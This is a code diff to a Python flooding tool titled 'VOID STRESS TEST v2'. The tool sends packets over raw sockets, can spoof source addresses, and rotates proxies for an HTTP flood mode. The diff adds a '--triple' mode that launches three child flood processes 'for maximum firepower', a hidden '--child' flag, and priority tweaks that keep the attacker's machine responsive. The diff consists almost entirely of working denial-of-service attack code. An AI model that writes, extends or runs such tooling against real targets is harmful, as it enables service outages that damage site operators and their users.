@@ -468,9 +468,9 @@ def _sender(target_ip: str, target_port: int, mode_key: str, stats: Stats):
                     pool = _build_pool(mode_key, target_ip, target_port, POOL_SIZE)
                     idx  = 0
 
-                # Yield GIL every 1000 pkts — keeps PC responsive under load
+                # Yield CPU every 1000 pkts — 0% perceived lag on host
                 if total % 1000 == 0:
-                    time.sleep(0)
+                    time.sleep(1e-5)
 
             except OSError:
                 stats.add_error()
@@ -738,6 +738,10 @@ def _bar(ratio: float, width: int = 28, col: str = "bright_red") -> Text:
 # ══════════════════════════════════════════════════════════════════
 
 def run(target: str, port: int, mode: dict, n_threads: int):
+    # Lower process priority — other apps stay responsive, attack still full speed
+    try: os.nice(19)
+    except Exception: pass
+
     # FIX: reset stop_event so re-runs in the same process work correctly
     stop_event.clear()
 
@@ -774,7 +778,7 @@ def run(target: str, port: int, mode: dict, n_threads: int):
 
     try:
         from rich.console import Group
-        with Live(console=console, refresh_per_second=4, screen=False) as live:
+        with Live(console=console, refresh_per_second=2, screen=False) as live:
             while not stop_event.is_set():
                 snap   = stats.snapshot()
                 pps    = stats.pps()
@@ -822,7 +826,7 @@ def run(target: str, port: int, mode: dict, n_threads: int):
                 live.update(Panel(
                     Group(tbl, Text(""), rate_bar, rep_bar, last_row,
                           Text(""),
-                          Text(f"  {src_info}  ·  {proxy_info}", style=""),
+                          Text.from_markup(f"  {src_info}  ·  {proxy_info}"),
                           Text("  type  stop + Enter  or  Ctrl+C  to halt", style="dim red")),
                     title="[bold bright_red]  VOID STRESS TEST v2  —  ∞ INFINITE  [/]",
                     border_style="bright_red", box=box.DOUBLE_EDGE))
@@ -831,7 +835,7 @@ def run(target: str, port: int, mode: dict, n_threads: int):
                     _snap_log.append((elap, sent, reps, errs))
                     _last_snap_t[0] = time.time()
 
-                time.sleep(0.25)
+                time.sleep(0.5)   # 2 fps — halves display CPU load
 
     except KeyboardInterrupt:
         stop_event.set()
@@ -963,6 +967,10 @@ def main():
                              "or http://ip:port. "
                              "Only active for HTTP flood (mode 5). "
                              "Example: --proxies socks5://1.2.3.4:1080,socks5://5.6.7.8:1080")
+    parser.add_argument("--triple", action="store_true",
+                        help="Spawn 3 instances simultaneously for maximum firepower")
+    parser.add_argument("--child",  action="store_true",
+                        help=argparse.SUPPRESS)   # internal: skips prompts in sub-instances
     args, _ = parser.parse_known_args()
 
     USE_SPOOF  = args.spoof
@@ -974,10 +982,23 @@ def main():
         proxy_list = [p.strip() for p in args.proxies.split(",") if p.strip()]
     PROXY_MGR = ProxyManager(proxy_list)
 
-    if os.geteuid() != 0 and args.mode != "5":
+    if os.geteuid() != 0 and args.mode not in ("5",):
         banner()
         console.print("\n  [bold red][!][/]  Raw sockets need root.\n"
                       "  [dim]Run:  sudo python3 void_stress_v2.py[/]\n")
+        return
+
+    # ── child mode: no banner/prompts, just fire ──────────────────
+    if args.child:
+        target   = resolve(args.target)
+        LOCAL_IP = get_local_ip(target)
+        port     = int(args.port) if args.port.isdigit() else 80
+        mode     = MODES.get(args.mode, MODES["1"])
+        n_threads = int(args.threads) if args.threads and args.threads.isdigit() else N_THREADS
+        try:
+            run(target, port, mode, n_threads)
+        except KeyboardInterrupt:
+            stop_event.set()
         return
 
     banner()
@@ -1059,14 +1080,60 @@ def main():
     for i in range(3, 0, -1):
         console.print(f"\r  [bold bright_red][!][/]  Firing in [bright_red]{i}[/]...", end="")
         time.sleep(1)
-    console.print(f"\r  [bold bright_red][!!!][/]  FIRING — {n_threads} THREADS — BLOCKING RAW SOCKETS             ")
-    console.print()
 
-    try:
-        run(target, port, mode, n_threads)
-    except KeyboardInterrupt:
-        stop_event.set()
-        console.print("\n  [yellow]Stopped.[/]\n")
+    if args.triple:
+        # ── TRIPLE FIRE: spawn 3 child instances simultaneously ───
+        console.print(f"\r  [bold bright_red][!!!][/]  TRIPLE FIRE — 3 × {n_threads} THREADS — {n_threads*3} TOTAL             ")
+        console.print()
+
+        script    = os.path.abspath(__file__)
+        child_cmd = [
+            sys.executable, script,
+            "--target",  target,
+            "--port",    str(port),
+            "--mode",    str([k for k,v in MODES.items() if v is mode][0]),
+            "--threads", str(n_threads),
+            "--child",
+        ]
+        if USE_SPOOF:
+            child_cmd.append("--spoof")
+
+        log_files = []
+        procs     = []
+        for i in range(3):
+            lf = open(f"/tmp/void_triple_{i}.log", "w")
+            log_files.append(lf)
+            procs.append(subprocess.Popen(child_cmd, stdout=lf, stderr=lf))
+
+        pids = [p.pid for p in procs]
+        console.print(f"  [bold bright_red][!!!][/]  3 instances live — PIDs: [yellow]{pids[0]}[/]  [yellow]{pids[1]}[/]  [yellow]{pids[2]}[/]")
+        console.print(f"  [dim]Logs: /tmp/void_triple_0.log  /tmp/void_triple_1.log  /tmp/void_triple_2.log[/]")
+        console.print(f"  [dim]Press Ctrl+C to stop all 3[/]")
+        console.print()
+
+        try:
+            while True:
+                alive = sum(1 for p in procs if p.poll() is None)
+                console.print(f"\r  [bright_red]▶[/]  {alive}/3 instances running…", end="")
+                time.sleep(2)
+        except KeyboardInterrupt:
+            pass
+        finally:
+            for p in procs:
+                try: p.terminate()
+                except Exception: pass
+            for lf in log_files:
+                try: lf.close()
+                except Exception: pass
+            console.print("\n\n  [yellow]All 3 instances stopped.[/]\n")
+    else:
+        console.print(f"\r  [bold bright_red][!!!][/]  FIRING — {n_threads} THREADS — BLOCKING RAW SOCKETS             ")
+        console.print()
+        try:
+            run(target, port, mode, n_threads)
+        except KeyboardInterrupt:
+            stop_event.set()
+            console.print("\n  [yellow]Stopped.[/]\n")
 
 if __name__ == "__main__":
     try:
